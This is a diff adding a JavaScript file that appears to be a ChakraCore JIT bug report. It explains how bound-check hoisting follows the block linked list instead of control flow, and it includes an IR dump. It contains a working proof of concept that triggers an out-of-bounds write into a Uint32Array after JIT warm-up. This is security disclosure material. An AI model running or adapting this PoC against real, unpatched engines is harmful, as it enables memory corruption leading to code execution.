@@ -1,0 +1,151 @@
+/*
+Chakra uses the InvariantBlockBackwardIterator class to backpropagate the information about the hoisted bound checks. But the class follows the linked list instaed of the control flow. This may lead to incorrectly remove the bound checks.
+
+In the following code, currentBlock's block number is 4 and hoistBlock's block number is 1 (please see the IR code). I assume it should visit 4 -> 3 (skipped) -> 1 (break) in order with following the control flow, but it actually visits 4 -> 3 (skipped) -> 2 -> 1 (break) in order. This makes the block 2 have the wrong information about the bounds which affects the bound checks in the block 5 to be removed.
+
+https://github.com/Microsoft/ChakraCore/blob/48c73e51c3e0fb36a08fa844cdb88c9d8a54de32/lib/Backend/GlobOpt.cpp#L14667
+
+if(hoistBlock != currentBlock)
+{
+    for(InvariantBlockBackwardIterator it(this, currentBlock->next, hoistBlock, nullptr);
+        it.IsValid();
+        it.MoveNext())
+    {
+        BasicBlock *const block = it.Block();
+        ...
+
+PoC:
+*/
+
+function opt(arr, idx) {
+    ((arr.length === 0x7ffffff0 && arr[0x7ffffff0]) || false) && (arr.length === 0x7ffffff0 && arr[0x7ffffff1]) || (arr[0x11111111] = 0x1234);
+}
+
+function main() {
+    let arr = new Uint32Array(1);
+    for (let i = 0; i < 10000; i++) {
+        opt(arr);
+    }
+}
+
+main();
+
+/*
+Here's the IR code for the PoC:
+
+  FunctionEntry   #
+---------
+
+BLOCK 0: Out(1, 2)
+
+$L8:                                                                          #
+    s1[Object].var  =  Ld_A           0xXXXXXXXX (GlobalObject)[Object].var   #
+    s21(s2)[CanBeTaggedValue_Int_IntCanBeUntagged].i32 = Ld_I4  2147483632 (0x7FFFFFF0)[CanBeTaggedValue_Int_IntCanBeUntagged].i32 #
+    s3[Boolean].var =  Ld_A           0xXXXXXXXX (false)[Boolean].var         #
+    s22(s4)[CanBeTaggedValue_Int_IntCanBeUntagged].i32 = Ld_I4  2147483633 (0x7FFFFFF1)[CanBeTaggedValue_Int_IntCanBeUntagged].i32 #
+    s23(s5)[CanBeTaggedValue_Int_IntCanBeUntagged].i32 = Ld_I4  286331153 (0x11111111)[CanBeTaggedValue_Int_IntCanBeUntagged].i32 #
+    s24(s6)[CanBeTaggedValue_Int_IntCanBeUntagged].i32 = Ld_I4  4660 (0x1234)[CanBeTaggedValue_Int_IntCanBeUntagged].i32 #
+    s7[LikelyCanBeTaggedValue_Uint32Array].var = ArgIn_A  prm2<40>[LikelyCanBeTaggedValue_Uint32Array].var! #
+    s8[LikelyUndefined_CanBeTaggedValue].var = ArgIn_A  prm3<48>[LikelyUndefined_CanBeTaggedValue].var! #
+
+
+  Line   2: arr.length === 0x7ffffff0 && arr[0x7ffffff0]) || false) && (arr.length === 0x7ffffff0 && arr[0x7ffffff1]) || (arr[0x11111111] = 0x1234);
+  Col    7: ^
+                       StatementBoundary  #0                                  #0000 
+                       BailOnNotArray  s7[LikelyCanBeTaggedValue_Uint32Array].var #0000  Bailout: #0000 (BailOutOnNotArray)
+    s25.u32         =  LdIndir        [s7[Uint32Array].var+32].u32            #0000 
+                       NoImplicitCallUses  s25.u32                            #0000 
+                       ByteCodeUses   s7                                      #0000 
+    s26(s10)[CanBeTaggedValue_Int_IntCanBeUntagged].i32 = Ld_I4  s25.u32      #0000 
+    s15[Boolean].var = Ld_A           0xXXXXXXXX (false)[Boolean].var         #0004 
+    s9[Boolean].var =  Ld_A           0xXXXXXXXX (false)[Boolean].var         #0004 
+                       ByteCodeUses   s10                                     #0004 
+                       BrNeq_I4       $L4, s26(s10)[CanBeTaggedValue_Int_IntCanBeUntagged].i32!, 2147483632 (0x7FFFFFF0).i32 #0004 
+---------
+
+BLOCK 1: In(0) Out(2, 3)
+
+$L7:                                                                          #0008 
+    s15[Boolean].var = Ld_A           0xXXXXXXXX (true)[Boolean].var          #0008 
+    s9[Boolean].var =  Ld_A           0xXXXXXXXX (true)[Boolean].var          #0008 
+                       BoundCheck     2147483633 < s25.u32                    #000f  Bailout: #000f (BailOutOnFailedHoistedBoundCheck)
+    s27.u64         =  LdIndir        [s7[Uint32Array].var+56].u64            #000f 
+                       NoImplicitCallUses  s25.u32                            #000f 
+    s28(s16)[CanBeTaggedValue_Int_IntCanBeUntagged].i32 = LdElemI_A  [s7[Uint32Array][seg: s27][segLen: s25][><].var+2147483632].var #000f  Bailout: #000f (BailOutConventionalTypedArrayAccessOnly)
+                       ByteCodeUses   s16                                     #0015 
+    s29(s9)[CanBeTaggedValue_Int_IntCanBeUntagged].i32 = Ld_I4  s28(s16)[CanBeTaggedValue_Int_IntCanBeUntagged].i32 #0015 
+    s9[CanBeTaggedValue_Int].var = ToVar  s29(s9)[CanBeTaggedValue_Int].i32   #0018 
+                       ByteCodeUses   s16                                     #0018 
+                       BrTrue_I4      $L3, s28(s16)[CanBeTaggedValue_Int_IntCanBeUntagged].i32! #0018 
+---------
+
+BLOCK 2: In(0, 1) Out(5)
+
+$L4:                                                                          #001c 
+    s9[Boolean].var =  Ld_A           0xXXXXXXXX (false)[Boolean].var         #001c 
+                       Br             $L2                                     #001e 
+---------
+
+BLOCK 3: In(1) Out(4) DeadOut(5)
+
+$L3:                                                                          #0021 
+                       NoImplicitCallUses  s25.u32                            #0021 
+                       ByteCodeUses   s7                                      #0021 
+    s30(s17)[CanBeTaggedValue_Int_IntCanBeUntagged].i32 = Ld_I4  s25.u32      #0021 
+    s18[Boolean].var = Ld_A           0xXXXXXXXX (false)[Boolean].var         #0025 
+    s9[Boolean].var =  Ld_A           0xXXXXXXXX (false)[Boolean].var         #0025 
+                       ByteCodeUses   s17                                     #0025 
+---------
+
+BLOCK 4: In(3) Out(8, 5)
+
+$L6:                                                                          #0029 
+    s18[Boolean].var = Ld_A           0xXXXXXXXX (true)[Boolean].var          #0029 
+    s9[Boolean].var =  Ld_A           0xXXXXXXXX (true)[Boolean].var          #0029 
+                       NoImplicitCallUses  s25.u32                            #0030 
+    s31(s19)[CanBeTaggedValue_Int_IntCanBeUntagged].i32 = LdElemI_A  [s7[Uint32Array][seg: s27][segLen: s25][><].var+2147483633].var #0030  Bailout: #0030 (BailOutConventionalTypedArrayAccessOnly)
+                       ByteCodeUses   s19                                     #0036 
+    s29(s9)[CanBeTaggedValue_Int_IntCanBeUntagged].i32 = Ld_I4  s31(s19)[CanBeTaggedValue_Int_IntCanBeUntagged].i32 #0036 
+    s9[CanBeTaggedValue_Int].var = ToVar  s29(s9)[CanBeTaggedValue_Int].i32   #0039 
+                       ByteCodeUses   s19                                     #0039 
+                       BrTrue_I4      $L9, s31(s19)[CanBeTaggedValue_Int_IntCanBeUntagged].i32! #0039 
+---------
+
+BLOCK 5: In(2, 4) Out(6) DeadIn(3)
+
+$L2:                                                                          #003d 
+    s32.u64         =  LdIndir        [s7[Uint32Array].var+56].u64            #003d 
+                       NoImplicitCallUses  s25.u32                            #003d 
+    [s7[Uint32Array][seg: s32][segLen: s25][><].var+286331153].var = StElemI_A  4660 (0x1234).i32 #003d  Bailout: #003d (BailOutConventionalTypedArrayAccessOnly)
+    s33(s20)[CanBeTaggedValue_Int_IntCanBeUntagged].i32 = Ld_I4  4660 (0x1234)[CanBeTaggedValue_Int_IntCanBeUntagged].i32 #0043 
+                       ByteCodeUses   s20                                     #0046 
+    s29(s9)[CanBeTaggedValue_Int_IntCanBeUntagged].i32 = Ld_I4  4660 (0x1234)[CanBeTaggedValue_Int_IntCanBeUntagged].i32 #0046 
+    s34.u64         =  Ld_A           s32.u64                                 #004b 
+                       Br             $L1                                     #004b 
+---------
+
+BLOCK 8: **** Air lock Block **** In(4) Out(6)
+
+$L9:                                                                          #004b 
+    s34.u64         =  Ld_A           s27.u64                                 #004b 
+                       Br             $L1                                     #004b 
+---------
+
+BLOCK 6: In(8, 5) Out(7)
+
+$L1:                                                                          #004b 
+    s0[Undefined].var = Ld_A          0xXXXXXXXX (undefined)[Undefined].var   #004b 
+
+
+  Line   3: }
+  Col    1: ^
+                       StatementBoundary  #1                                  #004d 
+                       StatementBoundary  #-1                                 #004d 
+                       Ret            s0[Undefined].var!                      #004d 
+---------
+
+BLOCK 7: In(6)
+
+$L5:                                                                          #
+----------------------------------------------------------------------------------------
+*/
